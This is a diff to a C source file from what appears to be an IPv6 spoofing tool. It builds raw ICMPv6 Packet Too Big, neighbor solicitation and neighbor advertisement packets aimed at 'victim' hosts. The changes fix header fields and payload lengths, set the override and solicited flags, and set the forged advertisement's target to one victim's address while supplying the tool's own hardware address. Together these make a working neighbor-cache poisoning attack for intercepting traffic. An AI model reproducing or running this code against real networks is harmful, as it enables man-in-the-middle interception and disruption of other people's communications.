@@ -12,6 +12,8 @@
 #include <device.h>
 #include <victims.h>
 
+#define IPV6_VERSION 6 << 4
+
 typedef struct pseudo_header {
 	struct in6_addr ph_src;
 	struct in6_addr ph_dst;
@@ -136,9 +138,11 @@ char *alloc_pkt2big(struct victim *svic, struct victim *dvic) {
 
 	/* IPv6 Header */
 	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
+	ip6->ip6_hops = 255;
+	ip6->ip6_vfc = IPV6_VERSION;
 	ip6->ip6_dst = dvic->ipv6;
 	ip6->ip6_src = svic->ipv6;
-	ip6->ip6_plen = htons(len) - (sizeof(struct ethhdr) + sizeof(struct ip6_hdr));
+	ip6->ip6_plen = htons(len - (sizeof(struct ethhdr) + sizeof(struct ip6_hdr)));
 	ip6->ip6_nxt = IPPROTO_ICMPV6;
 
 	/* ICMPv6 Header */
@@ -160,9 +164,9 @@ char *alloc_ndsolicit(struct in6_addr *addr) {
 	char *packet, *data;
 	unsigned int len = sizeof(struct ethhdr) +
 						sizeof(struct ip6_hdr) +
-						sizeof(struct nd_neighbor_solicit);// +
-					//	sizeof(struct nd_opt_hdr) +
-					//	ETH_ALEN;
+						sizeof(struct nd_neighbor_solicit) +
+						sizeof(struct nd_opt_hdr) +
+						ETH_ALEN;
 
 	if (!addr)
 		return NULL;
@@ -181,9 +185,11 @@ char *alloc_ndsolicit(struct in6_addr *addr) {
 	inet_pton(AF_INET6, "ff02::1:ff00:0", ip6->ip6_dst.s6_addr);
 	memcpy(&ip6->ip6_dst.s6_addr[13], &addr->s6_addr[13], 3);
 
+	ip6->ip6_hops = 255;
+	ip6->ip6_vfc = IPV6_VERSION;
+	ip6->ip6_nxt = IPPROTO_ICMPV6;
 	ip6->ip6_src = device.ipv6;
 	ip6->ip6_plen = htons(len - (sizeof(struct ethhdr) + sizeof(struct ip6_hdr)));
-	ip6->ip6_nxt = IPPROTO_ICMPV6;
 
 	/* Multicast ethernet address (rfc3307) */
 	memcpy(eth->h_dest, ether_aton("33:33:00:00:00:00"), ETH_ALEN);
@@ -198,13 +204,12 @@ char *alloc_ndsolicit(struct in6_addr *addr) {
 	memcpy(&nd->nd_ns_target, addr, sizeof(struct in6_addr));
 
 	/* Options */
-	#if 0
 	opt = (struct nd_opt_hdr *)((char *)nd + sizeof(struct nd_neighbor_solicit));
 	opt->nd_opt_type = ND_OPT_SOURCE_LINKADDR;
-	opt->nd_opt_len = 1;
+	opt->nd_opt_len = 1;	/* in units of 8 octets */
 	data = (char *)((char *)opt + sizeof(struct nd_opt_hdr));
 	memcpy(data, &device.hwaddr, ETH_ALEN);
-#endif
+
 	icmp6->icmp6_cksum = icmp6_cksum(ip6);
 
 	return packet;
@@ -240,26 +245,26 @@ char *alloc_ndadvert(struct victim *svic, struct victim *dvic) {
 
 	/* IPv6 Header */
 	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
+	ip6->ip6_hops = 255;
+	ip6->ip6_vfc = IPV6_VERSION;
 	ip6->ip6_dst = dvic->ipv6;
 	ip6->ip6_src = svic->ipv6;
-	ip6->ip6_plen = htons(len) - (sizeof(struct ethhdr) + sizeof(struct ip6_hdr));
+	ip6->ip6_plen = htons(len - (sizeof(struct ethhdr) + sizeof(struct ip6_hdr)));
 	ip6->ip6_nxt = IPPROTO_ICMPV6;
-	ip6->ip6_hlim = 255;
 
 	/* ICMPv6 Header */
 	icmp6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
 	icmp6->icmp6_type = ND_NEIGHBOR_ADVERT;
-	//*(icmp6->icmp6_data32) = ND_NA_FLAG_OVERRIDE || ND_NA_FLAG_OVERRIDE;
-	/* FIXME: No magic numbers.. :-) */
-	icmp6->icmp6_data8[0] = 0x60;
+	icmp6->icmp6_data8[0] = ND_NA_FLAG_OVERRIDE | ND_NA_FLAG_SOLICITED;
 
 	/* ND Advertise */
 	nd = (struct nd_neighbor_advert *)icmp6;
-	nd->nd_na_target = dvic->ipv6;
+	nd->nd_na_target = svic->ipv6;
 
+	/* Options */
 	opt = (struct nd_opt_hdr *)((char *)nd + sizeof(struct nd_neighbor_advert));
 	opt->nd_opt_type = ND_OPT_TARGET_LINKADDR;
-	opt->nd_opt_len = 1;
+	opt->nd_opt_len = 1;	/* in units of 8 octets */
 	hwaddr = (char *)((char *)opt + sizeof(struct nd_opt_hdr));
 	memcpy(hwaddr, &device.hwaddr, ETH_ALEN);
 
@@ -267,18 +272,3 @@ char *alloc_ndadvert(struct victim *svic, struct victim *dvic) {
 
 	return packet;
 }
-
-#ifdef __PKG_TEST__
-main() {
-	int i;
-	char *pkt = pkt2big();
-
-	for (i = 0; i < sizeof(struct ethhdr); i++) {
-		printf("%X", pkt[i]);
-		if (!((i + 1) % 10))
-			printf("\n");
-	}
-	printf("\n");
-}
-#endif
-
